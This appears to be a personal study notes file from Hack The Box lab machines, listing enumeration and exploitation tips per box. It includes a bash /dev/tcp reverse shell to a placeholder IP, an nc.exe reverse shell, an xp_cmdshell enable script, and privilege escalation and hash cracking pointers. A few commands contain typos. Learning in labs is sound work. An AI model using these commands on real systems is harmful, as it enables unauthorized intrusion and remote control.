Intended to capture observations during the walkthroughs for processes to apply or things to  remember when coming across certain steps during information gathering.

# Archetype
- If you see SMB, see if anonymous access is granted
    - `smbclient -N -L \\\\IP_ADDR\\`
    - If any are interesting, try to connect with `smbclient -N \\\IP_ADDR\shared_drive_name`

## `nmap`
Clever way to filter out the ports to analyze in greater detail:
```
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)nmap -sC-sV-p$ports10.10.10.27
```

## SQL
`SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')` run once authenticated to SQL DB to reveal whether current user has sysadmin privs
- Can enaable `xp_cmdshell`, with the following script:
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
reconfigure;
xp_cmdshell "whoami";
```

## Powershell
Powershell history file: `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.tx`

# Vaccine
Use `zip2john` to brute force attack password protected Zip files

Use www.cractstation.net for rainbow tables for known passwords

## SQL
- If using `sqlmap` and attacking a postgreSQL DB, use `--os-shell` to attempt to get shell
- If you have OS Shell, run `bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'` to get reverse shell (requires `nc` listener)

# Shield
- `gobuster` is an alternative to brute force open directories for a web app
- Can use `wp_admin_shell_upload` to get a meterpreter shell
- Upload the `nc.exe` executable and then execute it with `execute -f nc.exe -a "-e cmd.exe IP_ADDR LIST_PORT"`
- `JuicyPotato` to escalate privs

# Pathfinder
- `masscan` to determine open ports faster
- `bloodhound python` generates the files necessary to ingest into the `bloodhound` app
- `GetChangesAll` privileges within a domain can request replication data from a DC aka collect user hashes
- If Kerberos pre-auth is disabled, it's vulnerable to ASREPRoasting (https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)

# Included
- Check with `udp` scan for nmap if nothing too fruitful, can show tftp (port 69/udp)
- Vulnerable to directory traversal
- Pentest Monkey Reverse Shell Script: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- LXD Group = high privileged linux Group, which can be used to escalate to root

# Markup
- When there's LFI, and `ssh` enabled, look for private keys (`~/.ssh/id_rsa`) to gain access
- Use `icacls` on Win to look at permission
- Windows `exe`s are available in Kali under `/usr/share/windows-binaries`

# Guard
- escape permissions limitations with `man man` then `!bash`
- `/var/backups` location to check when enumerating the system
- `hashcat -m 1800` = unix passwords

# Base
- The developer is using `strcmp` to check the username and password, which is insecure and can easily be bypassed. This is due to the fact that if `strcmp` is given an empty array to compare against the stored password, it will return `null`. In PHP the `==` operator only checks the value of a variable for equality, and the value of `NULL` is equal to `0`. The correct way to write this would be with the `===` operator which checks both value and type. Let's open burp and catch the login request.
- Locationf of webshells on kali `/usr/share/webshells`
- If website is running on Linux - Enumeration tactic: `/var/www/html/login`